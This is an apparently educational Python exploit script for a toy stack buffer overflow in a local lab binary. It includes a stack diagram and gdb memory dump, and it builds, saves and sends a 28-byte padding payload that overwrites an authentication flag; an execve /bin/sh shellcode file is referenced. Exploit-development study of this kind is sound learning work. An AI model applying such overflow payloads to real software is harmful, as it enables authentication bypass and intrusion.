#!/usr/bin/python3
import sys
from subprocess import Popen, PIPE
import shlex
import struct

'''
Exploit Development on 
> x86-64 Arch => Linux kali 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64 GNU/Linux
> ARM Arch => 

Triggering manual exploitation
$ ./002_auth_overflow.elf $(python2 -c 'print "A"*28 + "\xad\xde"')

STACK DIAGRAM for - int check_authentication(char *password)

        +------------+ <-- rbp-0x20
        |  password  |
        +------------+
		...					[28 bytes to corrupt auth_flag]
		...
        +------------+ <-- rbp-0x4
        |  auth_flag |
        +------------+ <-- rbp
        |  saved FP  |
        +------------+
        |  saved RIP |
        +------------+

STACK state before ACID rain

STACK state after ACID rain
(gdb) x/20xw $rbp-0x20
0x7fffffffdcf0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffdd00: 0x41414141      0x41414141      0x41414141      0x00deadbe
0x7fffffffdd10: 0xffffdd30      0x00007fff      0x55555236      0x00005555
0x7fffffffdd20: 0xffffde48      0x00007fff      0x00000000      0x00000002
0x7fffffffdd30: 0x00000002      0x00000000      0xf7df418a      0x00007fff
'''

target = "./002_auth_overflow.elf"
shellcode = "./shellcode/execve_binsh.raw"

# CREATE payload
payload = bytearray()
payload += ("A"*28).encode('utf-8')
payload += struct.pack('<H', 0xdead)	# h (short value) as a 4-byte word would corrupt RBP (next to it on stack frame)
print ("CREATED payload: ", end = '')
print (payload)

# WRITE payload to DISK (useful to trigger manual exploitation)
filename = 'malinput.' + target[:-4].replace("./", "") + "." + sys.argv[0].replace("./", '')[:11]
fo = open( filename, 'wb')
fo.write(payload)
fo.close()
print ("WROTE payload to disk: " + filename)

# -x-x-x-x- SEND payload to vulnerable process -x-x-x-x-

print ("SENDING payload to target process: " + target)
print ()

# Send payload via CMD Line arguments
p = Popen([target, bytes(payload)])

'''
# Send payload via ENVIRONMENT variable
'''

'''
# Send payload via STDIN
p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload)
p.stdin.flush()
'''
